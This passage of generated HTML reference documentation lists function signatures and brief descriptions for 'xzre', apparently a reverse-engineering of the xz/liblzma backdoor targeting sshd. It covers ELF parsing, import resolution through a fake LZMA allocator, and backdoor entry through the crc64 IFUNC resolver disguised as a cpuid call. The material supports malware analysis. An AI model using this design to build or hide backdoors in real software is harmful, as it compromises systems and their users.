<tr class="memdesc:a2bf5f1627236a90a54515265280e8354"><td class="mdescLeft">&#160;</td><td class="mdescRight">checks if given ELF file contains the range [vaddr, vaddr+size) in a segment with the specified memory protection flags  <a href="xzre_8h.html#a2bf5f1627236a90a54515265280e8354">More...</a><br /></td></tr>
<tr class="separator:a2bf5f1627236a90a54515265280e8354"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2b6f96960f68c8cd69c6bb5bce25426b"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a2b6f96960f68c8cd69c6bb5bce25426b">elf_contains_vaddr_relro</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, u64 vaddr, u64 size, u32 p_flags)</td></tr>
<tr class="memdesc:a2b6f96960f68c8cd69c6bb5bce25426b"><td class="mdescLeft">&#160;</td><td class="mdescRight">checks if given ELF file contains the range [vaddr, vaddr+size) in the gnurelro segment  <a href="xzre_8h.html#a2b6f96960f68c8cd69c6bb5bce25426b">More...</a><br /></td></tr>
<tr class="separator:a2b6f96960f68c8cd69c6bb5bce25426b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a049328971f4e99ce954d5e0346fee6d7"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a049328971f4e99ce954d5e0346fee6d7">elf_parse</a> (Elf64_Ehdr *ehdr, <a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>)</td></tr>
<tr class="memdesc:a049328971f4e99ce954d5e0346fee6d7"><td class="mdescLeft">&#160;</td><td class="mdescRight">Parses the given in-memory ELF file into <a class="el" href="structelf__info.html">elf_info</a>.  <a href="xzre_8h.html#a049328971f4e99ce954d5e0346fee6d7">More...</a><br /></td></tr>
<tr class="separator:a049328971f4e99ce954d5e0346fee6d7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aae4bd899725c9e0825517734783f0433"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aae4bd899725c9e0825517734783f0433">is_gnu_relro</a> (Elf64_Word p_type, u32 addend)</td></tr>
<tr class="memdesc:aae4bd899725c9e0825517734783f0433"><td class="mdescLeft">&#160;</td><td class="mdescRight">checks if the provided identifiers represent a <code>PT_GNU_RELRO</code>  <a href="xzre_8h.html#aae4bd899725c9e0825517734783f0433">More...</a><br /></td></tr>
<tr class="separator:aae4bd899725c9e0825517734783f0433"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a642ed90d3ade30228b3286310de5e5c1"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a642ed90d3ade30228b3286310de5e5c1">main_elf_parse</a> (<a class="el" href="structmain__elf.html">main_elf_t</a> *<a class="el" href="structmain__elf.html">main_elf</a>)</td></tr>
<tr class="memdesc:a642ed90d3ade30228b3286310de5e5c1"><td class="mdescLeft">&#160;</td><td class="mdescRight">Parses the main executable from the provided structure. As part of the process the arguments and environment is checked.  <a href="xzre_8h.html#a642ed90d3ade30228b3286310de5e5c1">More...</a><br /></td></tr>
<tr class="separator:a642ed90d3ade30228b3286310de5e5c1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aeba34776520881226359e3a0524fbe7b"><td class="memItemLeft" align="right" valign="top"><a id="aeba34776520881226359e3a0524fbe7b"></a>
char *&#160;</td><td class="memItemRight" valign="bottom"><b>check_argument</b> (char arg_first_char, char *arg_name)</td></tr>
<tr class="separator:aeba34776520881226359e3a0524fbe7b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a04a9f7dfab9ccac6d8407c906b7b2e2e"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a04a9f7dfab9ccac6d8407c906b7b2e2e">process_is_sshd</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *elf, u8 *stack_end)</td></tr>
<tr class="memdesc:a04a9f7dfab9ccac6d8407c906b7b2e2e"><td class="mdescLeft">&#160;</td><td class="mdescRight">checks if the current process is sshd by inspecting <code>argv</code> and <code>envp</code>.  <a href="xzre_8h.html#a04a9f7dfab9ccac6d8407c906b7b2e2e">More...</a><br /></td></tr>
<tr class="separator:a04a9f7dfab9ccac6d8407c906b7b2e2e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a977d8b72a5f81675c76838347747d094"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a977d8b72a5f81675c76838347747d094">elf_find_string_references</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, <a class="el" href="structstring__references.html">string_references_t</a> *refs)</td></tr>
<tr class="memdesc:a977d8b72a5f81675c76838347747d094"><td class="mdescLeft">&#160;</td><td class="mdescRight">parses the ELF rodata section, looking for strings and the instructions that reference them  <a href="xzre_8h.html#a977d8b72a5f81675c76838347747d094">More...</a><br /></td></tr>
<tr class="separator:a977d8b72a5f81675c76838347747d094"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9d2747f12c29ef6eae1cc4b09f3cc5f7"><td class="memItemLeft" align="right" valign="top">Elf64_Sym *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a9d2747f12c29ef6eae1cc4b09f3cc5f7">elf_symbol_get</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId encoded_string_id, EncodedStringId sym_version)</td></tr>
<tr class="memdesc:a9d2747f12c29ef6eae1cc4b09f3cc5f7"><td class="mdescLeft">&#160;</td><td class="mdescRight">Looks up an ELF symbol from a parsed ELF.  <a href="xzre_8h.html#a9d2747f12c29ef6eae1cc4b09f3cc5f7">More...</a><br /></td></tr>
<tr class="separator:a9d2747f12c29ef6eae1cc4b09f3cc5f7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a099c6531c0b9aaf2a3caf6b001fa5109"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109">elf_symbol_get_addr</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId encoded_string_id)</td></tr>
<tr class="memdesc:a099c6531c0b9aaf2a3caf6b001fa5109"><td class="mdescLeft">&#160;</td><td class="mdescRight">Looks up an ELF symbol from a parsed ELF, and returns its memory address.  <a href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109">More...</a><br /></td></tr>
<tr class="separator:a099c6531c0b9aaf2a3caf6b001fa5109"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a18845fc4614f60083817db417dc32a13"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a18845fc4614f60083817db417dc32a13">elf_get_code_segment</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, u64 *pSize)</td></tr>
<tr class="memdesc:a18845fc4614f60083817db417dc32a13"><td class="mdescLeft">&#160;</td><td class="mdescRight">Obtains the address and size of the first executable segment in the given ELF file.  <a href="xzre_8h.html#a18845fc4614f60083817db417dc32a13">More...</a><br /></td></tr>
<tr class="separator:a18845fc4614f60083817db417dc32a13"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a55e085fd878446cf655c657491b9d522"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a55e085fd878446cf655c657491b9d522">elf_get_rodata_segment</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, u64 *pSize)</td></tr>
<tr class="memdesc:a55e085fd878446cf655c657491b9d522"><td class="mdescLeft">&#160;</td><td class="mdescRight">Obtains the address and size of the last readonly segment in the given ELF file this corresponds to the segment that typically contains .rodata.  <a href="xzre_8h.html#a55e085fd878446cf655c657491b9d522">More...</a><br /></td></tr>
<tr class="separator:a55e085fd878446cf655c657491b9d522"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a52148c8b1da2a37036e7975ea299117b"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a52148c8b1da2a37036e7975ea299117b">elf_get_data_segment</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, u64 *pSize, BOOL get_alignment)</td></tr>
<tr class="memdesc:a52148c8b1da2a37036e7975ea299117b"><td class="mdescLeft">&#160;</td><td class="mdescRight">Obtains the address and size of the last read-write segment in the given ELF file this is typically the segment that contains the following sections:  <a href="xzre_8h.html#a52148c8b1da2a37036e7975ea299117b">More...</a><br /></td></tr>
<tr class="separator:a52148c8b1da2a37036e7975ea299117b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a244da0ace01c1812168a0f7bb48bfd3b"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a244da0ace01c1812168a0f7bb48bfd3b">elf_get_reloc_symbol</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, Elf64_Rela *relocs, u32 num_relocs, u64 reloc_type, EncodedStringId encoded_string_id)</td></tr>
<tr class="memdesc:a244da0ace01c1812168a0f7bb48bfd3b"><td class="mdescLeft">&#160;</td><td class="mdescRight">Searches the ELF relocations for a symbol having name <code>encoded_string</code> id and relocation of type <code>reloc_type</code>.  <a href="xzre_8h.html#a244da0ace01c1812168a0f7bb48bfd3b">More...</a><br /></td></tr>
<tr class="separator:a244da0ace01c1812168a0f7bb48bfd3b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acbe9201dea64d4ae8112803f8af95985"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#acbe9201dea64d4ae8112803f8af95985">elf_get_plt_symbol</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId encoded_string_id)</td></tr>
<tr class="memdesc:acbe9201dea64d4ae8112803f8af95985"><td class="mdescLeft">&#160;</td><td class="mdescRight">Gets the PLT symbol with name <code>encoded_string_id</code> from the parsed ELF file.  <a href="xzre_8h.html#acbe9201dea64d4ae8112803f8af95985">More...</a><br /></td></tr>
<tr class="separator:acbe9201dea64d4ae8112803f8af95985"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acb54dcbcba1c88075c523678a0d0dbda"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#acb54dcbcba1c88075c523678a0d0dbda">elf_get_got_symbol</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId encoded_string_id)</td></tr>
<tr class="memdesc:acb54dcbcba1c88075c523678a0d0dbda"><td class="mdescLeft">&#160;</td><td class="mdescRight">Gets the GOT symbol with name <code>encoded_string_id</code> from the parsed ELF file.  <a href="xzre_8h.html#acb54dcbcba1c88075c523678a0d0dbda">More...</a><br /></td></tr>
<tr class="separator:acb54dcbcba1c88075c523678a0d0dbda"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a02157f429658403951e2f41eb0e01117"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a02157f429658403951e2f41eb0e01117">elf_find_function_pointer</a> (StringXrefId xref_id, void **pOutCodeStart, void **pOutCodeEnd, void **pOutFptrAddr, <a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, <a class="el" href="structstring__references.html">string_references_t</a> *xrefs, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a02157f429658403951e2f41eb0e01117"><td class="mdescLeft">&#160;</td><td class="mdescRight">this function searches for a function pointer, pointing to a function designated by the given <code>xref_id</code>  <a href="xzre_8h.html#a02157f429658403951e2f41eb0e01117">More...</a><br /></td></tr>
<tr class="separator:a02157f429658403951e2f41eb0e01117"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad86c0039d3a08468f5cf7187662ebab9"><td class="memItemLeft" align="right" valign="top">char *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ad86c0039d3a08468f5cf7187662ebab9">elf_find_string</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId *stringId_inOut, void *rodata_start_ptr)</td></tr>
<tr class="memdesc:ad86c0039d3a08468f5cf7187662ebab9"><td class="mdescLeft">&#160;</td><td class="mdescRight">Locates a string in the ELF .rodata section.  <a href="xzre_8h.html#ad86c0039d3a08468f5cf7187662ebab9">More...</a><br /></td></tr>
<tr class="separator:ad86c0039d3a08468f5cf7187662ebab9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afca457dee8895eff6b7fdeffd6bc279a"><td class="memItemLeft" align="right" valign="top">lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#afca457dee8895eff6b7fdeffd6bc279a">get_lzma_allocator</a> (void)</td></tr>
<tr class="memdesc:afca457dee8895eff6b7fdeffd6bc279a"><td class="mdescLeft">&#160;</td><td class="mdescRight">gets the fake LZMA allocator, used for imports resolution the "opaque" field of the structure holds a pointer to  <a href="xzre_8h.html#afca457dee8895eff6b7fdeffd6bc279a">More...</a><br /></td></tr>
<tr class="separator:afca457dee8895eff6b7fdeffd6bc279a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a048b695303b409f486861de0c24d6097"><td class="memItemLeft" align="right" valign="top"><a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a> *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a048b695303b409f486861de0c24d6097">get_lzma_allocator_address</a> (void)</td></tr>
<tr class="memdesc:a048b695303b409f486861de0c24d6097"><td class="mdescLeft">&#160;</td><td class="mdescRight">gets the address of the fake LZMA allocator  <a href="xzre_8h.html#a048b695303b409f486861de0c24d6097">More...</a><br /></td></tr>
<tr class="separator:a048b695303b409f486861de0c24d6097"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aeb6b7e7363a9d706fdd3704ef5faf584"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584">fake_lzma_alloc</a> (void *opaque, size_t nmemb, size_t size)</td></tr>
<tr class="memdesc:aeb6b7e7363a9d706fdd3704ef5faf584"><td class="mdescLeft">&#160;</td><td class="mdescRight">a fake alloc function called by lzma_alloc() that then calls <a class="el" href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109" title="Looks up an ELF symbol from a parsed ELF, and returns its memory address.">elf_symbol_get_addr()</a>  <a href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584">More...</a><br /></td></tr>
<tr class="separator:aeb6b7e7363a9d706fdd3704ef5faf584"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5565761b59b3ef6786b83a9b50f72b17"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a5565761b59b3ef6786b83a9b50f72b17">fake_lzma_free</a> (void *opaque, void *ptr)</td></tr>
<tr class="memdesc:a5565761b59b3ef6786b83a9b50f72b17"><td class="mdescLeft">&#160;</td><td class="mdescRight">a fake free function called by lzma_free()  <a href="xzre_8h.html#a5565761b59b3ef6786b83a9b50f72b17">More...</a><br /></td></tr>
<tr class="separator:a5565761b59b3ef6786b83a9b50f72b17"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae74ae3bc755debdef566fa9b24cf8dd7"><td class="memItemLeft" align="right" valign="top"><a class="el" href="structelf__functions.html">elf_functions_t</a> *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ae74ae3bc755debdef566fa9b24cf8dd7">get_elf_functions_address</a> (void)</td></tr>
<tr class="memdesc:ae74ae3bc755debdef566fa9b24cf8dd7"><td class="mdescLeft">&#160;</td><td class="mdescRight">gets the address of the <a class="el" href="structelf__functions.html">elf_functions</a>  <a href="xzre_8h.html#ae74ae3bc755debdef566fa9b24cf8dd7">More...</a><br /></td></tr>
<tr class="separator:ae74ae3bc755debdef566fa9b24cf8dd7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4faeea5b6941bead3c1a355a4ae12dc7"><td class="memItemLeft" align="right" valign="top"><a id="a4faeea5b6941bead3c1a355a4ae12dc7"></a>
BOOL&#160;</td><td class="memItemRight" valign="bottom"><b>secret_data_append_from_instruction</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx, <a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a> *cursor)</td></tr>
<tr class="separator:a4faeea5b6941bead3c1a355a4ae12dc7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad595372eac746eb11ddc536e5a20d667"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ad595372eac746eb11ddc536e5a20d667">secret_data_append_from_code</a> (void *code_start, void *code_end, <a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a> shift_cursor, unsigned shift_count, BOOL start_from_call)</td></tr>
<tr class="memdesc:ad595372eac746eb11ddc536e5a20d667"><td class="mdescLeft">&#160;</td><td class="mdescRight">Pushes secret data by validating the given code block.  <a href="xzre_8h.html#ad595372eac746eb11ddc536e5a20d667">More...</a><br /></td></tr>
<tr class="separator:ad595372eac746eb11ddc536e5a20d667"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2e827c4d8e3500f106150e786053dde2"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a2e827c4d8e3500f106150e786053dde2">secret_data_append_item</a> (<a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a> shift_cursor, unsigned operation_index, unsigned shift_count, int index, u8 *code)</td></tr>
<tr class="memdesc:a2e827c4d8e3500f106150e786053dde2"><td class="mdescLeft">&#160;</td><td class="mdescRight">Calls <a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a>, if <code>flags</code> are non-zero.  <a href="xzre_8h.html#a2e827c4d8e3500f106150e786053dde2">More...</a><br /></td></tr>
<tr class="separator:a2e827c4d8e3500f106150e786053dde2"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa80510b3b8c22dc0ccf6e123c393fb3d"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aa80510b3b8c22dc0ccf6e123c393fb3d">secret_data_append_items</a> (<a class="el" href="structsecret__data__item.html">secret_data_item_t</a> *items, u64 items_count, BOOL(*appender)(<a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a>, unsigned, unsigned, int, u8 *))</td></tr>
<tr class="memdesc:aa80510b3b8c22dc0ccf6e123c393fb3d"><td class="mdescLeft">&#160;</td><td class="mdescRight">appends multiple secret data items at once  <a href="xzre_8h.html#aa80510b3b8c22dc0ccf6e123c393fb3d">More...</a><br /></td></tr>
<tr class="separator:aa80510b3b8c22dc0ccf6e123c393fb3d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa7239c834d2598747c9158949280783b"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aa7239c834d2598747c9158949280783b">secret_data_append_from_address</a> (void *addr, <a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a> shift_cursor, unsigned shift_count, unsigned operation_index)</td></tr>
<tr class="memdesc:aa7239c834d2598747c9158949280783b"><td class="mdescLeft">&#160;</td><td class="mdescRight">calls <a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a> with either the given code address or the return address, if <code>addr</code> is &lt;= 1  <a href="xzre_8h.html#aa7239c834d2598747c9158949280783b">More...</a><br /></td></tr>
<tr class="separator:aa7239c834d2598747c9158949280783b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a48636f910a9c7df2f2adfa4abf7a73e9"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a> (u8 *call_site, u8 *code, <a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a> shift_cursor, unsigned shift_count, unsigned operation_index)</td></tr>
<tr class="memdesc:a48636f910a9c7df2f2adfa4abf7a73e9"><td class="mdescLeft">&#160;</td><td class="mdescRight">Shifts data in the secret data store, after validation of <code>code</code>. this function is intended to be invoked only once for each <code>operation_index</code> value. <code>operation_index</code> will be used as an index into a global array of flags, so that multiple calls with the same value will be a NO-OP.  <a href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">More...</a><br /></td></tr>
<tr class="separator:a48636f910a9c7df2f2adfa4abf7a73e9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ace528f88c27d645eafff5052f6c36bd0"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ace528f88c27d645eafff5052f6c36bd0">secret_data_append_from_call_site</a> (<a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a> shift_cursor, unsigned shift_count, unsigned operation_index, BOOL bypass)</td></tr>
<tr class="memdesc:ace528f88c27d645eafff5052f6c36bd0"><td class="mdescLeft">&#160;</td><td class="mdescRight">Shifts data in the secret data store, after validation of the call site, i.e. the caller of this function for more details, see <a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a>.  <a href="xzre_8h.html#ace528f88c27d645eafff5052f6c36bd0">More...</a><br /></td></tr>
<tr class="separator:ace528f88c27d645eafff5052f6c36bd0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a229ee0bd4111363061bc4230bc1f6423"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423">backdoor_setup</a> (<a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params_t</a> *params)</td></tr>
<tr class="memdesc:a229ee0bd4111363061bc4230bc1f6423"><td class="mdescLeft">&#160;</td><td class="mdescRight">the backdoor main method that installs the <a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc" title="the backdoored symbind64 installed in GLRO(dl_audit)">backdoor_symbind64()</a> callback  <a href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423">More...</a><br /></td></tr>
<tr class="separator:a229ee0bd4111363061bc4230bc1f6423"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a31d16cd16f66f61d34ff686d73464181"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a31d16cd16f66f61d34ff686d73464181">init_ldso_ctx</a> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a> *<a class="el" href="structldso__ctx.html">ldso_ctx</a>)</td></tr>
<tr class="memdesc:a31d16cd16f66f61d34ff686d73464181"><td class="mdescLeft">&#160;</td><td class="mdescRight">initializes/resets ldso data  <a href="xzre_8h.html#a31d16cd16f66f61d34ff686d73464181">More...</a><br /></td></tr>
<tr class="separator:a31d16cd16f66f61d34ff686d73464181"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a851b6ae19abb6961d0c6c21f382e0abc"><td class="memItemLeft" align="right" valign="top">unsigned int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a851b6ae19abb6961d0c6c21f382e0abc">backdoor_entry</a> (unsigned int cpuid_request, u64 *caller_frame)</td></tr>
<tr class="memdesc:a851b6ae19abb6961d0c6c21f382e0abc"><td class="mdescLeft">&#160;</td><td class="mdescRight">calls <a class="el" href="xzre_8h.html#a4662813f09936a772b6682e8bdd0be62">backdoor_init</a> while in the crc64() IFUNC resolver function  <a href="xzre_8h.html#a851b6ae19abb6961d0c6c21f382e0abc">More...</a><br /></td></tr>
<tr class="separator:a851b6ae19abb6961d0c6c21f382e0abc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4662813f09936a772b6682e8bdd0be62"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a4662813f09936a772b6682e8bdd0be62">backdoor_init</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *state, u64 *caller_frame)</td></tr>
<tr class="memdesc:a4662813f09936a772b6682e8bdd0be62"><td class="mdescLeft">&#160;</td><td class="mdescRight">calls <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2</a> by disguising it as a call to cpuid.  <a href="xzre_8h.html#a4662813f09936a772b6682e8bdd0be62">More...</a><br /></td></tr>
<tr class="separator:a4662813f09936a772b6682e8bdd0be62"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0ab331c3c38da2d4aa29f1c9178050fc"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a0ab331c3c38da2d4aa29f1c9178050fc">init_elf_entry_ctx</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *ctx)</td></tr>
<tr class="memdesc:a0ab331c3c38da2d4aa29f1c9178050fc"><td class="mdescLeft">&#160;</td><td class="mdescRight">initialises the elf_entry_ctx_t  <a href="xzre_8h.html#a0ab331c3c38da2d4aa29f1c9178050fc">More...</a><br /></td></tr>
<tr class="separator:a0ab331c3c38da2d4aa29f1c9178050fc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a127444706ffc25ccce1ee267c014957d"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a127444706ffc25ccce1ee267c014957d">update_got_offset</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *ctx)</td></tr>
<tr class="memdesc:a127444706ffc25ccce1ee267c014957d"><td class="mdescLeft">&#160;</td><td class="mdescRight">updates the offset to the GOT  <a href="xzre_8h.html#a127444706ffc25ccce1ee267c014957d">More...</a><br /></td></tr>
<tr class="separator:a127444706ffc25ccce1ee267c014957d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aee7738c9cab5f6733c666e0a20e5ba99"><td class="memItemLeft" align="right" valign="top">u64&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aee7738c9cab5f6733c666e0a20e5ba99">get_cpuid_got_index</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *ctx)</td></tr>
<tr class="memdesc:aee7738c9cab5f6733c666e0a20e5ba99"><td class="mdescLeft">&#160;</td><td class="mdescRight">get the cpuid() GOT index  <a href="xzre_8h.html#aee7738c9cab5f6733c666e0a20e5ba99">More...</a><br /></td></tr>
<tr class="separator:aee7738c9cab5f6733c666e0a20e5ba99"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8ab85586c2cbdd03ee2f734b92e3e3d6"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *ctx, u64 *caller_frame, void **cpuid_got_addr, <a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a> *reloc_consts)</td></tr>
<tr class="separator:a8ab85586c2cbdd03ee2f734b92e3e3d6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0d70747b6216270de07c783fc499938e"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a0d70747b6216270de07c783fc499938e">resolve_libc_imports</a> (struct link_map *libc, <a class="el" href="structelf__info.html">elf_info_t</a> *libc_info, <a class="el" href="structlibc__imports.html">libc_imports_t</a> *imports)</td></tr>
